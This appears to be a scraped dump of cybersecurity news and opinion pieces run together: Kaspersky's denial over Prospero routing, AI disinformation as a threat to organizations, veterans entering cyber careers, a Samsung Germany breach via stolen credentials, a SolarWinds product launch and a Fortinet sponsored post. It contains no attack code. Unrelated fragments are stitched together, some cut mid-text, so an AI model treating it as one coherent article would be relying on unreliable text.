entrusted with building and safeguarding Elon&#8217;s companies since 1999 and have a keen eye (as you do) for bad actors, so have enough perspective to tell you that Natalia has no bad blood and that she loves America.&#8221;</p>\n<p>Of course, this perspective comes from someone who has the utmost regard for the interests of the &#8220;special government employee&#8221; Mr. Musk, who has been bragging about tossing entire federal agencies into the &#8220;wood chipper,&#8221; and who recently <a href=\"https://apnews.com/article/musk-chainsaw-trump-doge-6568e9e0cfc42ad6cdcfd58a409eb312\" rel=\"noopener\" target=\"_blank\">wielded an actual chainsaw</a> on stage while referring to it as the &#8220;chainsaw for bureaucracy.&#8221;</p>\n<p>&#8220;Elon&#8217;s intentions are good and you can trust him,&#8221; Spikes assured.</p>\n<p>A special note of thanks for research assistance goes to <strong>Jacqueline Sweet</strong>, an independent investigative journalist whose work has been published in The Guardian, Rolling Stone, POLITICO and The Intercept.</p>",

Earlier this week, Spamhaus said it <a href=\"https://www.cidr-report.org/cgi-bin/as-report?as=AS200593\" rel=\"noopener\" target=\"_blank\">noticed</a> that Prospero was suddenly connecting to the Internet by routing through networks operated by Kaspersky Lab in Moscow.</p>\n<p><strong>Update, March 1, 9:43 a.m. ET:</strong> In a written statement, Kaspersky said it is aware of the public claim about the company allegedly providing services to a &#8220;bulletproof&#8221; web hosting provider. Here is their full statement:</p>\n<blockquote><p>&#8220;Kaspersky denies these claims as the company does not work and has never worked with the service provider in question. The routing through networks operated by Kaspersky doesn&#8217;t by default mean provision of the company&#8217;s services, as Kaspersky&#8217;s automatic system (AS) path might appear as a technical prefix in the network of telecom providers the company works with and provides its DDoS services.&#8221;</p>\n<p>&#8220;Kaspersky pays great attention to conducting business ethically and ensuring that its solutions are used for their original purpose of providing cybersecurity protection. The company is currently investigating the situation to inform the company whose network could have served as a transit for a &#8220;bulletproof&#8221; web hosting provider so that the former takes the necessary measures.&#8221;</p></blockquote>\n<p>Kaspersky began selling antivirus and security software in the United States in 2005, and the company&#8217;s malware researchers have earned accolades from the security community for many important discoveries over the years. But in September 2017, the Department of Homeland Security (DHS) barred U.S. federal agencies from using Kaspersky software, mandating its removal within 90 days.<span id=\"more-70525\"></span></p>\n<p>Cybersecurity reporter <strong>Kim Zetter</strong> notes that DHS didn&#8217;t cite any specific justification for its ban in 2017, but media reports quoting anonymous government officials referenced two incidents. Zetter wrote:</p>\n<blockquote><p>According to one story, an NSA contractor developing offensive hacking tools for the spy agency had Kaspersky software installed on his home computer where he was developing the tools, and the software detected the source code as malicious code and extracted it from his computer, as antivirus software is designed to do. A second story claimed that Israeli spies caught Russian government hackers using Kaspersky software to search customer systems for files containing U.S. secrets.</p>\n<p>Kaspersky denied that anyone used its software to search for secret information on customer machines and said that the tools on the NSA worker&#8217;s machine were detected in the same way that all antivirus software detects files it deems suspicious and then quarantines or extracts them for analysis.

        "content": "The next phase of AI disinformation won’t just target voters but target organizations, supply chains, and critical infrastructure.\nCredit: \t\t\t\t\t\t\t\t\t\t\t\t\t\t\tShutterstock\nThe 2024 election cycle was widely feared to be a watershed moment when artificial intelligence fundamentally changed the disinformation battlefield as\ndeepfake videos\n, AI-generated propaganda, and hyper-personalized bot campaigns disrupted political systems at an unprecedented scale.\nThe fear was not unfounded — hyper-realistic synthetic voices impersonating world leaders, AI-generated news websites seamlessly blending fabricated stories into the media ecosystem, and deepfake video hoaxes all seemed poised to overwhelm voters with disinformation. If adversaries could manufacture convincing falsehoods faster than defenders could debunk them, trust in elections — and democracy itself — could be eroded as never before.\nThat same AI-powered deception is already being weaponized beyond the political sphere with attackers using\ngenerative AI\nto impersonate executives, bypass identity verification systems, and automate large-scale fraud. AI-generated business email compromise (BEC) scams, synthetic identities, and deepfake-assisted phishing campaigns have surged in the past year. The same tactics designed to manipulate voters are being repurposed for cyber-enabled financial crimes, corporate espionage, and social engineering attacks — with far fewer defenses in place.\nYet, despite the dire warnings, AI-driven manipulation failed to upend elections in 2024. While there were alarming examples — including deepfake robocalls impersonating US President Joe Biden to suppress voter turnout and AI-generated hoaxes targeting Taiwanese elections — most incidents were quickly debunked. Their actual influence on electoral outcomes remained limited.\nBut that does not mean AI-driven deception is overhyped. The cybersecurity community, in particular, should see this moment not as a sign of resilience, but as a warning that adversaries are still refining their tactics. The next phase of AI disinformation won’t just target voters. It will target organizations, supply chains, and critical infrastructure, where the potential for damage is even greater. In short, the real AI disinformation crisis hasn’t arrived yet—but when it does, the consequences will extend far beyond elections.\nHow AI has changed the disinformation threat model\nAI is transforming disinformation operations into a scalable, low-cost cyber weapon, and adversaries are integrating these capabilities directly into their network attack strategies. What began as a tool for manipulating elections has rapidly evolved into an enabler for cybercriminals, intelligence agencies, and state-sponsored hackers.\nThe threat isn’t just an increase in false narratives online — it’s a fundamental shift in how deception is deployed, how it interacts with technical attack surfaces, and how it enables adversaries to extend and mask cyber operations inside compromised networks.\nRunning an\nadvanced persistent threat\n(APT) operation once required deep technical expertise in intrusion tactics, reconnaissance, and operational security. AI is lowering that threshold. Attackers — whether state-backed units or ransomware operators — can now use AI-assisted deception to manipulate threat intelligence environments, evade detection, and mislead defenders during incident response.\nGenerative AI allows for automated spear-phishing creation, synthetic identity generation for initial access, and deepfake-enhanced social engineering that can bypass traditional network security controls. Security teams relying on behavioral baselines for anomaly detection may soon find AI-generated deceptive behaviors indistinguishable from legitimate user activity inside their own networks.\nAttackers are using AI to distort and undermine threat intelligence\nAI-powered disinformation has moved beyond external influence — it is now reshaping adversary tactics inside compromised networks. Attackers can generate\nfalse system logs, fabricate network traffic, and manipulate forensic evidence\n,\nforcing incident response teams to chase misleading anomalies while real intrusions progress undetected. AI-assisted malware is also evolving toward\nmodular, adaptive evasion\n, allowing payloads to autonomously rewrite execution logic based on endpoint detection telemetry, ensuring continuous evasion.\nThe most dangerous shift is AI’s ability to\ndistort threat intelligence and attribution\n. Deepfake voices and synthetic transcripts are being used in\ncommand-and-control (C2) operations\n, deceiving incident responders into\ndisabling security controls\n. Nation-state actors are experimenting with\nAI-generated digital breadcrumbs\nto frame other groups for cyberattacks, making attribution increasingly unreliable. False-flag cyber incidents could escalate geopolitical tensions, with AI fabricating convincing evidence to manipulate international responses.\nCybercriminals are actively polluting\nthreat intelligence feeds with fabricated indicators of compromise (IOCs)\n,\ngenerating false victim reports, and introducing\nsynthetic attack data to erode defender confidence\n. AI-driven counterintelligence is no longer speculative — it is\nactively undermining forensic analysis and intelligence sharing\n.\nFor CISOs, red teams, and incident response leaders, AI deception is\nno longer just a phishing risk\n—\nit is a direct enabler of network intrusion, attack obfuscation, and security response manipulation\n. The deception arms race is accelerating, and security teams must\nadapt now or risk losing control of their own defensive environments\n.\nWhy AI disinformation didn’t dominate in 2024\nThe cybersecurity industry should take little comfort in the failure of AI-driven election disinformation to reshape the 2024 political landscape. The factors that blunted AI’s impact on elections do not extend to cybersecurity. If anything, the very lessons adversaries learned in the electoral arena will fuel the next generation of AI deception in network intrusions, fraud, and operational security evasion.\nAI disinformation struggled to dominate the 2024 elections largely due to regulatory and technical countermeasures. European regulators restricted generative AI’s role in political content, while tech firms implemented watermarking and detection tools. However, these barriers are not permanent. Adversaries are adapting, training AI models outside commercial oversight and shifting to custom-built generative tools designed to evade security detection.\nUnlike political actors, cybercriminals face no reputational risk in deploying AI deception. Ransomware gangs are already using deepfake audio to bypass voice authentication, while state-backed groups fabricate insider threats within corporate networks. AI’s ability to mimic human communication patterns is making phishing attacks more dynamic and convincing, shifting from static lures to adaptive, real-time engagement.\nVoter resilience—one of the key reasons AI disinformation fell flat—has no cybersecurity equivalent. Political misinformation often fails because of entrenched biases, but cyber deception does not rely on persuasion. A deepfake CEO call or spoofed login page only needs to appear legitimate enough to trigger compliance. Employees and security professionals, trained to respond to authority and urgent directives, are prime targets for AI-driven manipulation.\nWhile AI’s role in election disinformation was overestimated, its success in cyber-enabled fraud is undeniable. Deepfake CEO scams have already led to multimillion-dollar losses. AI-generated job postings and synthetic business identities are being used to steal credentials and infiltrate networks. Nation-state actors are refining AI-driven phishing personas that adapt in real time, making deception harder to detect.\nAI disinformation has not failed — it has evolved. The threat is shifting from public persuasion to targeted network exploitation. Organizations that assume AI’s limitations in election interference apply to cybersecurity risk falling behind. The real danger is not brute-force hacking but AI’s ability to manufacture legitimacy, manipulate trust, and embed deception into digital environments.\nThe AI threat isn’t over… it hasn’t actually arrived yet\nThe cybersecurity industry has braced for an explosion of AI-driven threats, from deepfake scams to automated disinformation. Instead of immediate chaos, what has emerged is a refinement phase where adversaries are testing and improving AI-driven deception in real-world environments. AI social engineering, network infiltration, and attack obfuscation are growing more precise, with attackers fine-tuning their methods before deploying them at scale.\nAI-generated personas are embedding within professional networks, building credibility before launching\ntargeted, real-time phishing campaigns\n. Attackers no longer rely on static email lures but deploy AI-driven engagement that adjusts dynamically based on victim responses, making social engineering harder to detect. Traditional security training has not prepared employees for AI-assisted manipulation that unfolds over weeks, mimicking professional relationships with unnerving precision.\nAI deception is also eroding\ndigital trust within security environments\n. Any email, voice message, or system-generated alert could be fabricated. Deepfake-enhanced fraud has bypassed biometric authentication, and attackers are now using AI-generated emergency alerts to mislead security teams during live incident responses. Inside compromised networks, AI is generating\nfalse system logs, synthetic traffic, and misleading forensic evidence\n, sending analysts chasing phantom anomalies while real attacks proceed undetected.\nThis period, where AI deception is still refining itself, is the most dangerous window for defenders. Organizations assuming AI threats are overstated will be unprepared when these capabilities emerge at full strength. The real shift is not just in volume but in strategy—AI deception is becoming a core element of cyber persistence, attack evasion, and security disruption. The arms race has already begun, and defenders who fail to recognize it will soon find themselves at a permanent disadvantage.\nWhat CISOs and security leaders should do now\nSecurity leaders must prepare not just to detect AI-generated threats, but to disrupt AI deception before it reaches full maturity. That means rethinking security assumptions before adversaries complete their refinement phase.\nA key shift must be in how security teams validate the information they rely on. AI-generated false threat intelligence, fabricated IOCs, and synthetic digital forensics will soon be used to manipulate security teams into chasing false positives, misclassifying real intrusions, and deprioritizing actual threats. Traditional trust models for security intelligence are breaking down. Threat attribution methods must be reassessed to prevent AI-generated false flags from distorting investigations.\nThe collapse of static identity verification is another imminent risk. Biometric voice authentication, video verification, and even document-based validation are already being bypassed with deepfake-enabled fraud. High-risk approvals, financial transactions, and internal security protocols must no longer rely on single-channel verification methods that AI-generated deception can defeat. And beyond detection, security leaders should begin stress-testing their own teams against AI-driven misinformation.\nControlled adversarial deception exercises should be embedded into security operations to analyze how attackers could seed false intelligence into SOC workflows, manipulate automated detection systems, and divert resources away from real threats. AI deception is not just about tricking individuals — it is about reshaping how entire security organizations perceive risk and allocate defenses.\nThe greatest mistake now would be treating AI deception as a contained issue rather than an evolving adversary capability that will soon permeate every layer of cybersecurity. AI deception isn’t a future problem — it is a latent one that is rapidly refining itself today. Security leaders must act before attackers complete the iteration cycle and bring these capabilities to full operational strength.\nRelated content\nNews\nMicrosoft’s AI tool catches critical GRUB2, U-boot bootloader flaws\nBy\nGyana Swain\n02 Apr 2025\n6 mins\nGenerative AI\nSecurity\nVulnerabilities\nOpinion\n10 best practices for vulnerability management according to CISOs\nBy\nJon Oltsik\n02 Apr 2025\n7 mins\nCSO and CISO\nIT Leadership\nThreat and Vulnerability Management\nFeature\nDownload the Strategizing Data Analytics for AI Enterprise Spotlight\nBy\nCIO.com and InfoWorld staff\n01 Apr 2025\n1 min\nGenerative AI\nOther Sections\nPODCASTS\nVIDEOS\nRESOURCES\nEVENTS\nSPOTLIGHT: SOLVING DATA ANALYTICS CHALLENGES\nSUBSCRIBE TO OUR NEWSLETTER\nFrom our editors straight to your inbox\nGet started by entering your email address below.\nPlease enter a valid email address\nSubscribe",

        "content": "Paying attention to the specific needs of military members transitioning to civilian security positions can help organizations improve their recruitment and retention, and the process can benefit hiring programs in general.\nCredit: \t\t\t\t\t\t\t\t\t\t\t\t\t\t\tShutterstock\nWith a bachelor’s degree in computer science, some cybersecurity work experience, and more than 20 years of US Army and National Guard service, Chris Elgee would seem perfectly positioned to easily move into a civilian cybersecurity role after his military career.\nBut Elgee saw challenges as he made his move. “I thought I didn’t really have the resume that showed my experience,” he says, noting that not all HR professionals, cybersecurity hiring managers, and their resume-scanning software could translate the description of his skills from military-speak to something a civilian could understand.\nElgee also felt he lacked an adequate network of private-sector contacts who could lead him to the right position at the right company. “It would have been helpful to have a veteran in cybersecurity to talk to, to say, ‘this is how to speak civilian cyber’ and to help with the transition,” he adds.\nSo Elgee enrolled in the SANS Veterans Cyber Academy, an intensive, accelerated training program to fill in those missing elements. He is now a pentester with Counter Hack Challenges, a certified instructor with training organization SANS, and a brigade operations officer (S3) with the Virginia National Guard.\nMatching military experience with skills on the outside is key\nHis experience isn’t uncommon among those switching from one profession to cybersecurity. Indeed, many people struggle with articulating how prior work experience speaks to an open security role and finding mentors who can guide them in their new careers.\nBut Elgee and others say such challenges can be more pronounced for veterans as they transition out of the military because of its unique work and culture.\nRecognizing such challenges matters, they add, explaining that organizations that seek to hire veterans would have more success recruiting and retaining them if they better understood what veterans need to succeed in their new roles as cybersecurity employees.\nMoreover, veterans and veteran advocates stress that gaining such insights — and then acting upon them — will help organizations not only recruit and retain more veterans but also strengthen their recruitment and retention practices for all workers.\nAnd that, they note, could be a boon for CISOs and their organizations as cybersecurity roles\ncontinue to outpace available talent\n.\nSecurity is built into just about any military role\n“Veterans make great cybersecurity specialists, because they’ve had security-focused roles, whether physical or information security — no matter what branch of the service they were in,” says Bryan Radliff, a 31-year veteran of the US Army who now serves as the CyberVets program manager in the Onward to Opportunity program for\nSyracuse University’s D’Aniello Institute for Veterans and Military Families\n(IVMF).\nCyberVets is a skills-to-job pathway that fast-tracks veterans into high-demand cyber careers by providing no-cost employment training, industry certifications, and career services to transitioning service members, veterans, and military spouses.\nThrough initiatives such as Onward to Opportunity (O2O), IVMF provides free career training and professional certifications for transitioning service members, veterans, and military spouses.\n“Veterans have the experience, the motivation. They’ve worked on projects, they’ve led people, they’ve managed money or people or resources,” Radliff says.\n“But they do have to learn to work in a new culture, and they have to learn civilian-speak,” he adds. “They’re trying to find that next so what, where do they fit in. And while a lot of companies say they’re ‘veteran-friendly,’ veterans need them to be veteran supportive, with mentors and training to help them adjust to the change of culture and show how they can bring their skill sets to the organization.”\nVets are a natural fit as cybersecurity pros\nBoth civilian and military leaders have long seen\nveterans as strong candidates for cybersecurity roles\n. The National Initiative for Cybersecurity Careers and Studies, part of the US Cybersecurity and Infrastructure Security Agency (CISA),\nspeaks directly to veterans\n, saying “\nYour\nskills and training from the military translate well to a cyber career.”\nNICCS continues, “Veterans’ backgrounds in managing high-pressure situations, attention to detail, and understanding of secure communications make them particularly well-suited for this career path.”\nGretchen Bliss, director of cybersecurity programs at the University of Colorado at Colorado Springs (UCCS), speaks specifically to security execs on the matter: “If I were talking to a CISO, I’d say get your hands on a veteran. They understand the practical application piece, the operational piece, they have hands-on experience. They think things through, they know how to do diagnostics. They already know how to tackle problems.”\nBut like Elgee and Radliff, Bliss says many transitioning veterans need some guidance on moving into corporate America, where “the chain of command and hierarchy aren’t the same,” as well as integrating into civilian work environments that often operate in ways significantly different than the military.\nBut does military experience really prepare you for civvy street?\nMany veterans also need guidance on framing their military experience in ways that best showcase how it will deliver for a CISO and the CISO’s team, they add.\nAll that is on top of the training and upskilling that many transitioning veterans require — particularly if they’re coming from military roles that were not specifically IT or cybersecurity focused.\n“I know a lot of veterans who struggled when they come out because they don’t prep themselves,” says US Army veteran Jereme Hardy, a graduate of IVMF’s O2O cybersecurity program who now works as a cybersecurity engineer at security services firm Modus21.\nEven though he had an IT background, Hardy enrolled in Onward to Opportunity (O2O), a free career training program that provides professional certification and employee support services to transitioning service members, veterans and military spouses, offered through IVMF.\nYurena Burgess, a nurse practitioner who served 15 years in the US Army, is pursuing a bachelor of innovation in computer security at UCCS’s College of Engineering and Applied Science. She decided to pursue a career in cybersecurity because of its growth potential.\nDespite doing her own research, Burgess says she wasn’t clear on what a career path in cybersecurity looks like, and she didn’t have a network of people to ask about that.\n“It was hard to understand the umbrella of possibilities. Yes, I could look at it online, but it would have been good to have someone guiding me on how to match what I have [with my military experience] to where I can go in a cybersecurity career, to see what the possibilities are, and to understand how can I put my skills to use and transfer my knowledge – which I’m doing slowly as I navigate all the cybersecurity certifications,” Burgess says.\nTo be clear, neither Burgess nor any others suggest that such challenges hold back veterans any more than civilians. Rather, they say that being able to access education, training, networks, and mentors has helped them be more successful in launching their careers and plotting the next steps in their new professions.\nGetting support from organizations\nAnd plenty of companies are doing just that, says Paul Andrus, a principal data scientist at Oracle who entered the cybersecurity industry after serving nearly 20 years in the US Marine Corps.\nHe says he has found that HR departments and hiring managers can decipher the military lingo that turns up on veterans’ resumes and can match a soldier’s MOS, or Military Occupational Specialty, or an airman’s AFSC (Air Force Specialty Code) to the skills it required and the types of experience it yielded. And many, including his own company have programs to recruit and support military members transitioning out of the service and into the civilian workforce.\n“It’s hard for me to quantify this, but organizations are quite receptive to veterans. Companies seem quite sincere in helping veterans,” he says, pointing out that they’ve been recruiting former military members for decades.\nOf course, veterans must have the skills needed for the jobs they seek; demonstrate a knowledge of the open position’s duties and the hiring company’s industry; and articulate how their military experience makes them a top candidate, just as any applicant must do, Andrus says.\nThere is help if you know where to look\nAnd for veterans who haven’t yet mastered all that, Andrus advises “networking with people who actually do the job you want.” He also advises veterans to learn about the environment at the organization they seek to join, asking themselves whether they’d fit in. And he recommends connecting with others to ease the transition.\n“You may feel like you’re on the edge of a canyon, but wingmen exist on the other side, too, find them and build those peer relationships,” he says. “There are a lot of agencies that help with this by providing training and education and networking, but ultimately it’s going to be the veteran that gets out there to prove they can do the job and be a good fit.”\nElgee advises veterans entering cyber to find a professional community (pointing specifically to the nonprofit\nVetSec\n), build a network of contacts working in cybersecurity, enlist mentors, and position military experiences and skills in terms that speak to the needs of civilian-side cybersecurity jobs.\nHe also advises veterans to “go for something they think is interesting,” whether that’s pen testing, forensics or another of the myriad jobs in the cybersecurity field. “You’re going to have more fun at work if you’re picking something you’re interested in,” he says, adding that’s good advice for everyone.\nAs for CISOs and their HR teams, he recommends they have targeted outreach to veterans, by, for example, recruiting at the job fairs held on posts and bases. “It’s not like our population is hard to find,” Elgee says. “And companies with veterans on staff – and most are going to have veterans on staff already – can engage those folks to reach out to applicants to help bridge any gaps.”\nRelated content\nFeature\nThe CSO guide to top security conferences\nBy\nCSO Staff\n31 Mar 2025\n8 mins\nApplication Security\nEvents\nTechnology Industry\nFeature\n11 hottest IT security certs for higher pay today\nBy\nEric Frank\n21 Mar 2025\n11 mins\nCertifications\nIT Skills\nIT Training\nNews Analysis\n39% of IT leaders fear major incident due to excessive workloads\nBy\nEvan Schuman\n03 Feb 2025\n6 mins\nIT Skills\nIncident Response\nSecurity Operations Center\nOther Sections\nPODCASTS\nVIDEOS\nRESOURCES\nEVENTS\nSPOTLIGHT: SOLVING DATA ANALYTICS CHALLENGES\nSUBSCRIBE TO OUR NEWSLETTER\nFrom our editors straight to your inbox\nGet started by entering your email address below.\nPlease enter a valid email address\nSubscribe",

Security specialist\nHudson Rock,\nwhich analyzed the breach, finding that initial access was gained via login credentials stolen by an infostealer in 2021.\nAttack via IT service provider\nAt that time, the login credentials were stolen from the computer of an employee of IT service provider Spectos, which offers software to monitor and improve service quality. It is linked to Samsung’s German ticket system at samsung-shop.spectos.com. Apparently, the compromised credentials had not been updated for years.\nCybercriminals are\nincreasingly leveraging legitimate identity access\nacross their attack chains to access systems and remain undetected once inside. That the previously leaked login credential remained valid for four years is notable. “Samsung could’ve acted, but they didn’t, and now the damage is done,” Hudson Rock researchers wrote in their report.\nIn response to a query from CSO, Samsung Germany confirmed: “An incident involving unauthorized access to customer data occurred on an IT system belonging to one of Samsung’s business partners in Germany.” However, all further questions remain unanswered. The company stated that it is currently investigating the extent of the incident.\nThis isn’t the first cyber incident at Samsung. In 2022,\nthe systems at Samsung’s US site were hacked\n.

Among the capabilities this product provides are AI-powered alert isolation, on-call management, multi-source alert correlation, standardized runbooks, status pages, and Microsoft Teams and Slack integrations, according to SolarWinds. These capabilities will enable faster incident identification to reduce downtime and speed remediation time, SolarWinds says.\n“Squadcast brings together comprehensive incident response capabilities to our portfolio and leverages AI to unify on-call management and alert correlation. It standardizes and automates runbooks for faster, more efficient incident resolution,” says Krishna Sai, senior vice president and chief technology officer at SolarWinds.\nThe company also bolstered its\nSolarWinds Observability\nproduct with new integrations and support for cloud environments, including Google Cloud Platform (GCP), Amazon Web Services (AWS), and Microsoft Azure. The extended capabilities will provide IT operations teams with a\nunified view of the entire hybrid IT environment\n, SolarWinds says.\n“Organizations are rarely 100% cloud-native or on-premises, and invariably, assuming otherwise always limits the benefit of modern IT solutions. In reality, most organizations use a hybrid cloud approach; they have workloads that are on-prem, workloads that are on public cloud, workloads around the private cloud, and they often mix different sets of solutions to meet their needs,” Sai says. “Our announcement marks a significant milestone in helping organizations navigate hybrid more confidently, with better visibility, enabling better collaboration and flexibility. And more importantly, it helps organizations be more resilient in a continually evolving IT landscape.”\nAlso new to the platform is an AI-powered Log Insights feature that surfaces critical information from large volumes of log data to identify patterns, anomalies, and other trends that would indicate potential problems in the environment. These updates are important for monitoring today’s IT environments, Sai says, as networks and applications become more complex. IT teams must be able to detect issues before they become major incidents. Also in the SolarWinds Observability platform is Root Cause Assist, which taps\nSolarWinds AI\nto identify the underlying causes of problems or issues by analyzing data and providing contextual insights, automating and accelerating the analysis of application performance issues.\nSolarWinds also enhanced its service desk offering with the AI Runbook feature, which automates the manual task of compiling and formatting pre-written operational guides into new runbooks with standardized resolution processes.\n“One of the things that we have taken care of in building these AI solutions is to make sure that the overall user experience of how we build AI and roll it out is very, very well-thought-out and very comprehensive in the product,” Sai says. “The adoption of AI is directly proportional to the trust you can build in AI-based decision making.”\nSquadcast Incident Response and the AI-based enhancements to the SolarWinds portfolio are available now.\nRelated content\nNews\nSplunk launches inventory tool to simplify OpenTelemetry monitoring\nBy\nDenise Dubie\nApr 02, 2025\n3 mins\nNetwork Management Software\nNetwork Monitoring\nNews\nNetBox Labs launches drift detection tool to tame configuration chaos\nBy\nDenise Dubie\nApr 02, 2025\n4 mins\nNetwork Management Software\nNetwork Monitoring\nFeature\nDownload the Strategizing Data Analytics for AI Enterprise Spotlight\nBy\nCIO.com and InfoWorld staff\nApr 01, 2025\n1 min\nArtificial Intelligence\nGenerative AI\nOther Sections\nPODCASTS\nVIDEOS\nRESOURCES\nEVENTS\nSpotlight: Solving Data Analytics Challenges\nSUBSCRIBE TO OUR NEWSLETTER\nFrom our editors straight to your inbox\nGet started by entering your email address below.\nPlease enter a valid email address\nSubscribe",

        "content": "More than ever, cybercriminal networks are now operating like legitimate businesses. In response, organizations must adopt a threat-informed defense approach that shifts the focus from reactive responses to proactive, intelligence-driven security operations.\nCredit: \t\t\t\t\t\t\t\t\t\t\t\t\t\t\tLazy_Bear\nAs the threat landscape continues to evolve, critical infrastructure sectors face a growing wave of sophisticated cyber threats. Traditional security strategies that focus solely on indicators of compromise (IoCs) are proving insufficient against the scale and speed of modern cyberattacks.\nTo address today’s challenges, organizations must adopt a threat-informed defense approach—one that shifts the focus from reactive responses to proactive, intelligence-driven security operations.\nThe rise of cybercrime-as-a-service\nToday’s macro threat landscape is a flourishing ecosystem of cybercrime facilitated by crime-as-a-service (CaaS) models. Cybercriminal networks now operate like legitimate businesses, with specialized units dedicated to activities such as money laundering, malware development, and spear phishing. This ecosystem lowers the barrier to entry for cybercrime, enabling low-skilled adversaries to launch highly targeted and disruptive attacks with minimal effort.\nOne of the most concerning trends is the rise of reconnaissance-as-a-service, where threat actors conduct extensive network mapping before an attack. This intelligence is then packaged and sold to the highest bidder, increasing the likelihood of successful breaches. And with the weaponization of AI now in place, these reconnaissance efforts have become more automated and precise, allowing cybercriminals to scale their operations at an unprecedented rate.\nThe convergence of IT and OT threats\nCybercrime has historically targeted IT systems, while nation-state actors have focused on disrupting\noperational technology\n(OT) environments. However, this division is rapidly dissolving as financially motivated attackers recognize the high stakes involved in OT disruptions. Due to the potential financial and operational impact of attacks, manufacturing, energy, and utilities have now become prime targets.\nFor example, initial access brokers (IABs) now infiltrate OT networks and sell access to ransomware groups or other malicious actors. According to threat intelligence data presented at the\nFortinet OT Summit 2025\n, cyberattacks targeting operational technology in the energy and utilities sector surged by 300% over 2024,\n[i]\n“with billions of threats detected across critical infrastructure sectors.” These attackers exploit weak security controls in legacy OT systems, leveraging reconnaissance data to refine their attack vectors.\nAI-driven cyberattacks: A growing concern\nThe weaponization of AI has introduced new attack methodologies. While early cyberattacks relied on pre-programmed or automated algorithms—such as scripted scanning, enumeration, and basic exploitation—today’s adversaries are starting to use AI-driven, multi-stage attacks that can dynamically adapt in real-time. For example, generative AI assists attackers in reconnaissance and social engineering. This shift from automation to true AI-driven attack chains means defenders must adopt equally sophisticated defense mechanisms.\nOne alarming trend is using AI to craft highly personalized phishing campaigns in local languages, increasing their effectiveness. Additionally, attackers now leverage AI for advanced evasion techniques, such as blending malicious activities with legitimate system processes to avoid detection. The next phase of AI-driven threats will likely involve real-time decision-making during attacks, making them even more difficult to mitigate.\nOperationalizing threat intelligence for defense\nA threat-informed defense strategy requires organizations to continuously integrate threat intelligence into their security operations—not just to understand the threat landscape but to translate that understanding into active, adaptive defense. This concept, formalized by MITRE, emphasizes the cyclical integration of cyber threat intelligence, testing and evaluation, and defensive measures to create a continuously improving security posture.\nFortinet\nThe MITRE threat-informed defense (TID) model illustrates how each phase informs the next: Intelligence drives testing, testing validates defenses, and the results of those defenses refine future intelligence. This ongoing loop is central to building resilience against advanced and persistent threats. In many ways, this approach parallels the industry’s shift toward continuous threat exposure management (CTEM).\nBuilding on this model, four key components form the operational backbone of an effective TID strategy:\nCyber threat intelligence:\nCurate and contextualize threat data to understand adversary tactics, techniques, and procedures (TTPs); campaign trends; and potential risks to your specific environment.\nTesting and evaluation:\nThrough red teaming, blue teaming, and purple teaming, continuously simulate and assess real-world attack scenarios to uncover exposures and test detection and response mechanisms.\nDetection engineering:\nAdapt existing defenses and build new detection logic as attackers develop novel or evasive techniques. This includes engineering for visibility into OT-specific threats and cross-domain attack paths.\nDefensive measures and automated response:\nEmploy AI and automation—via tools like SOAR and EDR—to reduce response times and ensure coordinated, consistent defense across IT and OT environments.\nTogether, these elements reinforce MITRE’s vision for threat-informed defense: a living, dynamic security model built on actionable intelligence, validated testing, and resilient defenses that evolve with the threat landscape.\nIndustry collaboration: A collective defense model\nNo single entity can tackle the cyber threat landscape alone. Industry-wide collaboration is essential to improving collective defenses. Public-private partnerships, threat intelligence sharing, and joint initiatives—such as the Cyber Threat Alliance and Cybercrime Atlas—help organizations stay ahead of adversaries. Working closely with law enforcement agencies, these initiatives have led to the takedown of major cybercrime operations and the arrest of thousands of cybercriminals.\nAdditionally, frameworks like MITRE ATT&CK for ICS provide a standardized approach to understanding OT-specific adversary behaviors. Organizations should be leveraging these insights to tailor their defenses against sector-specific threats.\nLooking ahead: The future of OT security\nThe rapid convergence of IT, OT, and cloud environments presents both challenges and opportunities for cybersecurity professionals. As attackers continue to refine their strategies, defenders must embrace a proactive, intelligence-driven approach.\nOrganizations can shift from a reactive security posture to a resilient, threat-informed defense strategy by integrating AI-driven threat intelligence, automating incident response, and fostering industry collaboration. As the cyber battlefield evolves, the key to success lies in understanding the adversary, anticipating their moves, and taking decisive action before an attack occurs.\nThe value of a threat-informed defense\nIt is critical to remember that threat-informed defense is not just an interesting concept but a crucial necessity in today’s cyber threat landscape. As attacks grow in sophistication, organizations must move from static security models to dynamic, intelligence-driven strategies.\nBy operationalizing threat intelligence, embracing automation, and collaborating with industry peers, critical infrastructure sectors can fortify and maintain their defenses to stay ahead of emerging threats.\nLearn more about Fortinet’s\nFortiGuard Labs\nthreat research and intelligence organization.\n[i]\nFortinet OT Summit 2025, Derek Manky, “Threat-Informed Defense for Operational Technology: Moving from Information to Action to Operationalize Threat Intel,” presented March 2025. FortiGuard Labs threat intelligence data indicated a 300% increase in OT-related cyberattacks in North America's energy and utilities sector between Q1 and Q4 of 2024.\nRelated content\nBrandpost\nSponsored by Fortinet\nPublic-private partnerships: A catalyst for industry growth and maturity\nBy\nDerek Manky\n20 Mar 2025\n5 mins\nSecurity\nBrandpost\nSponsored by Fortinet\nDLP solutions vs today’s cyberthreats: The urgent need for modern solutions\nBy\nDavid Lorti, Director of Product Marketing, Fortinet\n13 Feb 2025\n7 mins\nSecurity\nBrandpost\nSponsored by Fortinet\nWorld Economic Forum Annual Meeting 2025: Takeaways, reflections, and learnings for the future\nBy\nDerek Manky, Chief Security Strategist and Global VP of Threat Intelligence, Fortinet\n11 Feb 2025\n4 mins\nSecurity\nBrandpost\nSponsored by Fortinet\nDon’t overlook these key SSE components\nBy\nNirav Shah, SVP of Products and Solutions, Fortinet\n18 Dec 2024\n4 mins\nSecurity\nOther Sections\nPODCASTS\nVIDEOS\nRESOURCES\nEVENTS\nSPOTLIGHT: SOLVING DATA ANALYTICS CHALLENGES\nSUBSCRIBE TO OUR NEWSLETTER\nFrom our editors straight to your inbox\nGet started by entering your email address below.\nPlease enter a valid email address\nSubscribe",

